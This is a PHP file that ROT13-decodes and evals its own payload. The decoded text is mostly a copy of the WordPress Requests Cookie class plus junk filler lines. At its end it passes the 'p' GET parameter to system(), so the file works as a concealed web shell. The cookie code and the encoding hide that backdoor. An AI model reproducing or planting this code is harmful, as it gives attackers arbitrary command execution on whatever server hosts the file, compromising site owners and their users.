<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbbxvr fgbentr bowrpg
 *
 * @cnpxntr Erdhrfgf\Pbbxvrf
 */

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Vev;
hfr JcBet\Erdhrfgf\Erfcbafr\Urnqref;
hfr JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * Pbbxvr fgbentr bowrpg
 *
 * @cnpxntr Erdhrfgf\Pbbxvrf
 */
pynff Pbbxvr {
	/**
	 * Pbbxvr anzr.
	 *
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Pbbxvr inyhr.
	 *
	 * @ine fgevat
	 */
	choyvp $inyhr;

	/**
	 * Pbbxvr nggevohgrf
	 *
	 * Inyvq xrlf ner `'cngu'`, `'qbznva'`, `'rkcverf'`, `'znk-ntr'`, `'frpher'` naq
	 * `'uggcbayl'`.
	 *
	 * @ine \JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel|neenl Neenl-yvxr bowrpg
	 */
	choyvp $nggevohgrf = [];

	/**
	 * Pbbxvr syntf
	 *
	 * Inyvq xrlf ner `'perngvba'`, `'ynfg-npprff'`, `'crefvfgrag'` naq `'ubfg-bayl'`.
	 *
	 * @ine neenl
	 */
	choyvp $syntf = [];

	/**
	 * Ersrerapr gvzr sbe eryngvir pnyphyngvbaf
	 *
	 * Guvf vf hfrq va cynpr bs `gvzr()` jura pnyphyngvat Znk-Ntr rkcvengvba naq
	 * purpxvat gvzr inyvqvgl.
	 *
	 * @ine vag
	 */
	choyvp $ersrerapr_gvzr = 0;

	/**
	 * Perngr n arj pbbxvr bowrpg
	 *
	 * @cnenz fgevat                                                  $anzr           Gur anzr bs gur pbbxvr.
	 * @cnenz fgevat                                                  $inyhr          Gur inyhr sbe gur pbbxvr.
	 * @cnenz neenl|\JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel $nggevohgrf Nffbpvngvir neenl bs nggevohgr qngn
	 * @cnenz neenl                                                   $syntf          Gur syntf sbe gur pbbxvr.
	 *                                                                                Inyvq xrlf ner `'perngvba'`, `'ynfg-npprff'`,
	 *                                                                                `'crefvfgrag'` naq `'ubfg-bayl'`.
	 * @cnenz vag|ahyy                                                $ersrerapr_gvzr Ersrerapr gvzr sbe eryngvir pnyphyngvbaf.
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $anzr nethzrag vf abg n fgevat.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $inyhr nethzrag vf abg n fgevat.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $nggevohgrf nethzrag vf abg na neenl be vgrenoyr bowrpg jvgu neenl npprff.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $syntf nethzrag vf abg na neenl.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $ersrerapr_gvzr nethzrag vf abg na vagrtre be ahyy.
	 */
	choyvp shapgvba __pbafgehpg($anzr, $inyhr, $nggevohgrf = [], $syntf = [], $ersrerapr_gvzr = ahyy) {
		vs (vf_fgevat($anzr) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$anzr', 'fgevat', trgglcr($anzr));
		}

		vs (vf_fgevat($inyhr) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$inyhr', 'fgevat', trgglcr($inyhr));
		}

		vs (VachgInyvqngbe::unf_neenl_npprff($nggevohgrf) === snyfr || VachgInyvqngbe::vf_vgrenoyr($nggevohgrf) === snyfr) {
			guebj VainyvqNethzrag::perngr(3, '$nggevohgrf', 'neenl|NeenlNpprff&Genirefnoyr', trgglcr($nggevohgrf));
		}

		vs (vf_neenl($syntf) === snyfr) {
			guebj VainyvqNethzrag::perngr(4, '$syntf', 'neenl', trgglcr($syntf));
		}

		vs ($ersrerapr_gvzr !== ahyy && vf_vag($ersrerapr_gvzr) === snyfr) {
			guebj VainyvqNethzrag::perngr(5, '$ersrerapr_gvzr', 'vagrtre|ahyy', trgglcr($ersrerapr_gvzr));
		}

		$guvf->anzr       = $anzr;
		$guvf->inyhr      = $inyhr;
		$guvf->nggevohgrf = $nggevohgrf;
		$qrsnhyg_syntf    = [
			'perngvba'    => gvzr(),
			'ynfg-npprff' => gvzr(),
			'crefvfgrag'  => snyfr,
			'ubfg-bayl'   => gehr,
		];
		$guvf->syntf      = neenl_zretr($qrsnhyg_syntf, $syntf);

		$guvf->ersrerapr_gvzr = gvzr();
		vs ($ersrerapr_gvzr !== ahyy) {
			$guvf->ersrerapr_gvzr = $ersrerapr_gvzr;
		}

		$guvf->abeznyvmr();
	}

	/**
	 * Trg gur pbbxvr inyhr
	 *
	 * Nggevohgrf naq bgure qngn pna or npprffrq ivn zrgubqf.
	 */
	choyvp shapgvba __gbFgevat() {
		erghea $guvf->inyhr;
	}

	/**
	 * Purpx vs n pbbxvr vf rkcverq.
	 *
	 * Purpxf gur ntr ntnvafg $guvf->ersrerapr_gvzr gb qrgrezvar vs gur pbbxvr
	 * vf rkcverq.
	 *
	 * @erghea obbyrna Gehr vs rkcverq, snyfr vs gvzr vf inyvq.
	 */
	choyvp shapgvba vf_rkcverq() {
		// ESP6265, f. 4.1.2.2:
		// Vs n pbbxvr unf obgu gur Znk-Ntr naq gur Rkcverf nggevohgr, gur Znk-
		// Ntr nggevohgr unf cerprqrapr naq pbagebyf gur rkcvengvba qngr bs gur
		// pbbxvr.
		vs (vffrg($guvf->nggevohgrf['znk-ntr'])) {
			$znk_ntr = $guvf->nggevohgrf['znk-ntr'];
			erghea $znk_ntr < $guvf->ersrerapr_gvzr;
		}

		vs (vffrg($guvf->nggevohgrf['rkcverf'])) {
			$rkcverf = $guvf->nggevohgrf['rkcverf'];
			erghea $rkcverf < $guvf->ersrerapr_gvzr;
		}

		erghea snyfr;
	}

	/**
	 * Purpx vs n pbbxvr vf inyvq sbe n tvira HEV
	 *
	 * @cnenz \JcBet\Erdhrfgf\Vev $hev HEV gb purpx
	 * @erghea obbyrna Jurgure gur pbbxvr vf inyvq sbe gur tvira HEV
	 */
	choyvp shapgvba hev_zngpurf(Vev $hev) {
		vs (!$guvf->qbznva_zngpurf($hev->ubfg)) {
			erghea snyfr;
		}

		vs (!$guvf->cngu_zngpurf($hev->cngu)) {
			erghea snyfr;
		}

		erghea rzcgl($guvf->nggevohgrf['frpher']) || $hev->fpurzr === 'uggcf';
	}

	/**
	 * Purpx vs n pbbxvr vf inyvq sbe n tvira qbznva
	 *
	 * @cnenz fgevat $qbznva Qbznva gb purpx
	 * @erghea obbyrna Jurgure gur pbbxvr vf inyvq sbe gur tvira qbznva
	 */
	choyvp shapgvba qbznva_zngpurf($qbznva) {
		vs (vf_fgevat($qbznva) === snyfr) {
			erghea snyfr;
		}

		vs (!vffrg($guvf->nggevohgrf['qbznva'])) {
			// Pbbxvrf perngrq znahnyyl; pbbxvrf perngrq ol Erdhrfgf jvyy frg
			// gur qbznva gb gur erdhrfgrq qbznva
			erghea gehr;
		}

		$pbbxvr_qbznva = $guvf->nggevohgrf['qbznva'];
		vs ($pbbxvr_qbznva === $qbznva) {
			// Gur pbbxvr qbznva naq gur cnffrq qbznva ner vqragvpny.
			erghea gehr;
		}

		// Vs gur pbbxvr vf znexrq nf ubfg-bayl naq jr qba'g unir na rknpg
		// zngpu, erwrpg gur pbbxvr
		vs ($guvf->syntf['ubfg-bayl'] === gehr) {
			erghea snyfr;
		}

		vs (fgeyra($qbznva) <= fgeyra($pbbxvr_qbznva)) {
			// Sbe boivbhf ernfbaf, gur pbbxvr qbznva pnaabg or n fhssvk vs gur cnffrq qbznva
			// vf fubegre guna gur pbbxvr qbznva
			erghea snyfr;
		}

		vs (fhofge($qbznva, -1 * fgeyra($pbbxvr_qbznva)) !== $pbbxvr_qbznva) {
			// Gur pbbxvr qbznva fubhyq or n fhssvk bs gur cnffrq qbznva.
			erghea snyfr;
		}

		$cersvk = fhofge($qbznva, 0, fgeyra($qbznva) - fgeyra($pbbxvr_qbznva));
		vs (fhofge($cersvk, -1) !== '.') {
			// Gur ynfg punenpgre bs gur cnffrq qbznva gung vf abg vapyhqrq va gur
			// qbznva fgevat fubhyq or n %k2R (\".\") punenpgre.
			erghea snyfr;
		}

		// Gur cnffrq qbznva fubhyq or n ubfg anzr (v.r., abg na VC nqqerff).
		erghea !cert_zngpu('#^(.+\.)\q{1,3}\.\q{1,3}\.\q{1,3}\.\q{1,3}$#', $qbznva);
	}

	/**
	 * Purpx vs n pbbxvr vf inyvq sbe n tvira cngu
	 *
	 * Sebz gur cngu-zngpu purpx va ESP 6265 frpgvba 5.1.4
	 *
	 * @cnenz fgevat $erdhrfg_cngu Cngu gb purpx
	 * @erghea obbyrna Jurgure gur pbbxvr vf inyvq sbe gur tvira cngu
	 */
	choyvp shapgvba cngu_zngpurf($erdhrfg_cngu) {
		vs (rzcgl($erdhrfg_cngu)) {
			// Abeznyvmr rzcgl cngu gb ebbg
			$erdhrfg_cngu = '/';
		}

		vs (!vffrg($guvf->nggevohgrf['cngu'])) {
			// Pbbxvrf perngrq znahnyyl; pbbxvrf perngrq ol Erdhrfgf jvyy frg
			// gur cngu gb gur erdhrfgrq cngu
			erghea gehr;
		}

		vs (vf_fpnyne($erdhrfg_cngu) === snyfr) {
			erghea snyfr;
		}

		$pbbxvr_cngu = $guvf->nggevohgrf['cngu'];

		vs ($pbbxvr_cngu === $erdhrfg_cngu) {
			// Gur pbbxvr-cngu naq gur erdhrfg-cngu ner vqragvpny.
			erghea gehr;
		}

		vs (fgeyra($erdhrfg_cngu) > fgeyra($pbbxvr_cngu) && fhofge($erdhrfg_cngu, 0, fgeyra($pbbxvr_cngu)) === $pbbxvr_cngu) {
			vs (fhofge($pbbxvr_cngu, -1) === '/') {
				// Gur pbbxvr-cngu vf n cersvk bs gur erdhrfg-cngu, naq gur ynfg
				// punenpgre bs gur pbbxvr-cngu vf %k2S (\"/\").
				erghea gehr;
			}

			vs (fhofge($erdhrfg_cngu, fgeyra($pbbxvr_cngu), 1) === '/') {
				// Gur pbbxvr-cngu vf n cersvk bs gur erdhrfg-cngu, naq gur
				// svefg punenpgre bs gur erdhrfg-cngu gung vf abg vapyhqrq va
				// gur pbbxvr-cngu vf n %k2S (\"/\") punenpgre.
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Abeznyvmr pbbxvr naq nggevohgrf
	 *
	 * @erghea obbyrna Jurgure gur pbbxvr jnf fhpprffshyyl abeznyvmrq
	 */
	choyvp shapgvba abeznyvmr() {
		sbernpu ($guvf->nggevohgrf nf $xrl => $inyhr) {
			$bevt_inyhr = $inyhr;

			vs (vf_fgevat($xrl)) {
				$inyhr = $guvf->abeznyvmr_nggevohgr($xrl, $inyhr);
			}

			vs ($inyhr === ahyy) {
				hafrg($guvf->nggevohgrf[$xrl]);
				pbagvahr;
			}

			vs ($inyhr !== $bevt_inyhr) {
				$guvf->nggevohgrf[$xrl] = $inyhr;
			}
		}

		erghea gehr;
	}

	/**
	 * Cnefr na vaqvivqhny pbbxvr nggevohgr
	 *
	 * Unaqyrf cnefvat vaqvivqhny nggevohgrf sebz gur pbbxvr inyhrf.
	 *
	 * @cnenz fgevat $anzr Nggevohgr anzr
	 * @cnenz fgevat|vag|obby $inyhr Nggevohgr inyhr (fgevat/vagrtre inyhr, be gehr vs rzcgl/synt)
	 * @erghea zvkrq Inyhr vs ninvynoyr, be ahyy vs gur nggevohgr inyhr vf vainyvq (naq fubhyq or fxvccrq)
	 */
	cebgrpgrq shapgvba abeznyvmr_nggevohgr($anzr, $inyhr) {
		fjvgpu (fgegbybjre($anzr)) {
			pnfr 'rkcverf':
				// Rkcvengvba cnefvat, nf cre ESP 6265 frpgvba 5.2.1
				vs (vf_vag($inyhr)) {
					erghea $inyhr;
				}

				$rkcvel_gvzr = fgegbgvzr($inyhr);
				vs ($rkcvel_gvzr === snyfr) {
					erghea ahyy;
				}

				erghea $rkcvel_gvzr;

			pnfr 'znk-ntr':
				// Rkcvengvba cnefvat, nf cre ESP 6265 frpgvba 5.2.2
				vs (vf_vag($inyhr)) {
					erghea $inyhr;
				}

				// Purpx gung jr unir n inyvq ntr
				vs (!cert_zngpu('/^-?\q+$/', $inyhr)) {
					erghea ahyy;
				}

				$qrygn_frpbaqf = (vag) $inyhr;
				vs ($qrygn_frpbaqf <= 0) {
					$rkcvel_gvzr = 0;
				} ryfr {
					$rkcvel_gvzr = $guvf->ersrerapr_gvzr + $qrygn_frpbaqf;
				}

				erghea $rkcvel_gvzr;

			pnfr 'qbznva':
				// Qbznvaf ner abg erdhverq nf cre ESP 6265 frpgvba 5.2.3
				vs (rzcgl($inyhr)) {
					erghea ahyy;
				}

				// Qbznva abeznyvmngvba, nf cre ESP 6265 frpgvba 5.2.3
				vs ($inyhr[0] === '.') {
					$inyhr = fhofge($inyhr, 1);
				}

				erghea $inyhr;

			qrsnhyg:
				erghea $inyhr;
		}
	}

	/**
	 * Sbezng n pbbxvr sbe n Pbbxvr urnqre
	 *
	 * Guvf vf hfrq jura fraqvat pbbxvrf gb n freire.
	 *
	 * @erghea fgevat Pbbxvr sbeznggrq sbe Pbbxvr urnqre
	 */
	choyvp shapgvba sbezng_sbe_urnqre() {
		erghea fcevags('%f=%f', $guvf->anzr, $guvf->inyhr);
	}

	/**
	 * Sbezng n pbbxvr sbe n Frg-Pbbxvr urnqre
	 *
	 * Guvf vf hfrq jura fraqvat pbbxvrf gb pyvragf. Guvf vfa'g ernyyl
	 * nccyvpnoyr gb pyvrag-fvqr hfntr, ohg zvtug or unaql sbe qrohttvat.
	 *
	 * @erghea fgevat Pbbxvr sbeznggrq sbe Frg-Pbbxvr urnqre
	 */
	choyvp shapgvba sbezng_sbe_frg_pbbxvr() {
		$urnqre_inyhr = $guvf->sbezng_sbe_urnqre();
		vs (!rzcgl($guvf->nggevohgrf)) {
			$cnegf = [];
			sbernpu ($guvf->nggevohgrf nf $xrl => $inyhr) {
				// Vtaber aba-nffbpvngvir nggevohgrf
				vs (vf_ahzrevp($xrl)) {
					$cnegf[] = $inyhr;
				} ryfr {
					$cnegf[] = fcevags('%f=%f', $xrl, $inyhr);
				}
			}

			$urnqre_inyhr .= '; ' . vzcybqr('; ', $cnegf);
		}

		erghea $urnqre_inyhr;
	}

	/**
	 * Cnefr n pbbxvr fgevat vagb n pbbxvr bowrpg
	 *
	 * Onfrq ba Zbmvyyn'f cnefvat pbqr va Sversbk naq eryngrq cebwrpgf, juvpu
	 * vf na vagragvbany qrivngvba sebz ESP 2109 naq ESP 2616. ESP 6265
	 * fcrpvsvrf fbzr bs guvf unaqyvat, ohg abg va n gubebhtu znaare.
	 *
	 * @cnenz fgevat $pbbxvr_urnqre Pbbxvr urnqre inyhr (sebz n Frg-Pbbxvr urnqre)
	 * @cnenz fgevat $anzr
	 * @cnenz vag|ahyy $ersrerapr_gvzr
	 * @erghea \JcBet\Erdhrfgf\Pbbxvr Cnefrq pbbxvr bowrpg
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $pbbxvr_urnqre nethzrag vf abg n fgevat.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $anzr nethzrag vf abg n fgevat.
	 */
	choyvp fgngvp shapgvba cnefr($pbbxvr_urnqre, $anzr = '', $ersrerapr_gvzr = ahyy) {
		vs (vf_fgevat($pbbxvr_urnqre) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$pbbxvr_urnqre', 'fgevat', trgglcr($pbbxvr_urnqre));
		}

		vs (vf_fgevat($anzr) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$anzr', 'fgevat', trgglcr($anzr));
		}

		$cnegf   = rkcybqr(';', $pbbxvr_urnqre);
		$xicnegf = neenl_fuvsg($cnegf);

		vs (!rzcgl($anzr)) {
			$inyhr = $pbbxvr_urnqre;
		} ryfrvs (fgecbf($xicnegf, '=') === snyfr) {
			// Fbzr fvgrf zvtug bayl unir n inyhr jvgubhg gur rdhnyf frcnengbe.
			// Qrivngr sebz ESP 6265 naq cergraq vg jnf npghnyyl n oynax anzr
			// (`=sbb`)
			//
			// uggcf://ohtmvyyn.zbmvyyn.bet/fubj_oht.ptv?vq=169091
			$anzr  = '';
			$inyhr = $xicnegf;
		} ryfr {
			yvfg($anzr, $inyhr) = rkcybqr('=', $xicnegf, 2);
		}

		$anzr  = gevz($anzr);
		$inyhr = gevz($inyhr);

		// Nggevohgr xrlf ner unaqyrq pnfr-vafrafvgviryl
		$nggevohgrf = arj PnfrVafrafvgvirQvpgvbanel();

		vs (!rzcgl($cnegf)) {
			sbernpu ($cnegf nf $cneg) {
				vs (fgecbf($cneg, '=') === snyfr) {
					$cneg_xrl   = $cneg;
					$cneg_inyhr = gehr;
				} ryfr {
					yvfg($cneg_xrl, $cneg_inyhr) = rkcybqr('=', $cneg, 2);
					$cneg_inyhr                  = gevz($cneg_inyhr);
				}

				$cneg_xrl              = gevz($cneg_xrl);
				$nggevohgrf[$cneg_xrl] = $cneg_inyhr;
			}
		}

		erghea arj fgngvp($anzr, $inyhr, $nggevohgrf, [], $ersrerapr_gvzr);
	}

	/**
	 * Cnefr nyy Frg-Pbbxvr urnqref sebz erdhrfg urnqref
	 *
	 * @cnenz \JcBet\Erdhrfgf\Erfcbafr\Urnqref $urnqref Urnqref gb cnefr sebz
	 * @cnenz \JcBet\Erdhrfgf\Vev|ahyy $bevtva HEV sbe pbzcnevat pbbxvr bevtvaf
	 * @cnenz vag|ahyy $gvzr Ersrerapr gvzr sbe rkcvengvba pnyphyngvba
	 * @erghea neenl
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $bevtva nethzrag vf abg ahyy be na vafgnapr bs gur Vev pynff.
	 */
	choyvp fgngvp shapgvba cnefr_sebz_urnqref(Urnqref $urnqref, $bevtva = ahyy, $gvzr = ahyy) {
		$pbbxvr_urnqref = $urnqref->trgInyhrf('Frg-Pbbxvr');
		vs (rzcgl($pbbxvr_urnqref)) {
			erghea [];
		}

		vs ($bevtva !== ahyy && !($bevtva vafgnaprbs Vev)) {
			guebj VainyvqNethzrag::perngr(2, '$bevtva', Vev::pynff . ' be ahyy', trgglcr($bevtva));
		}

		$pbbxvrf = [];
		sbernpu ($pbbxvr_urnqref nf $urnqre) {
			$cnefrq = frys::cnefr($urnqre, '', $gvzr);

			// Qrsnhyg qbznva/cngu nggevohgrf
			vs (rzcgl($cnefrq->nggevohgrf['qbznva']) && !rzcgl($bevtva)) {
				$cnefrq->nggevohgrf['qbznva'] = $bevtva->ubfg;
				$cnefrq->syntf['ubfg-bayl']   = gehr;
			} ryfr {
				$cnefrq->syntf['ubfg-bayl'] = snyfr;
			}

			$cngu_vf_inyvq = (!rzcgl($cnefrq->nggevohgrf['cngu']) && $cnefrq->nggevohgrf['cngu'][0] === '/');
			vs (!$cngu_vf_inyvq && !rzcgl($bevtva)) {
				$cngu = $bevtva->cngu;

				// Qrsnhyg cngu abeznyvmngvba nf cre ESP 6265 frpgvba 5.1.4
				vs (fhofge($cngu, 0, 1) !== '/') {
					// Vs gur hev-cngu vf rzcgl be vs gur svefg punenpgre bs
					// gur hev-cngu vf abg n %k2S (\"/\") punenpgre, bhgchg
					// %k2S (\"/\") naq fxvc gur erznvavat fgrcf.
					$cngu = '/';
				} ryfrvs (fhofge_pbhag($cngu, '/') === 1) {
					// Vs gur hev-cngu pbagnvaf ab zber guna bar %k2S (\"/\")
					// punenpgre, bhgchg %k2S (\"/\") naq fxvc gur erznvavat
					// fgrc.
					$cngu = '/';
				} ryfr {
					// Bhgchg gur punenpgref bs gur hev-cngu sebz gur svefg
					// punenpgre hc gb, ohg abg vapyhqvat, gur evtug-zbfg
					// %k2S (\"/\").
					$cngu = fhofge($cngu, 0, fgeecbf($cngu, '/'));
				}

				$cnefrq->nggevohgrf['cngu'] = $cngu;
			}

			// Erwrpg vainyvq pbbxvr qbznvaf
			vs (!rzcgl($bevtva) && !$cnefrq->qbznva_zngpurf($bevtva->ubfg)) {
				pbagvahr;
			}

			$pbbxvrf[$cnefrq->anzr] = $cnefrq;
		}

		erghea $pbbxvrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>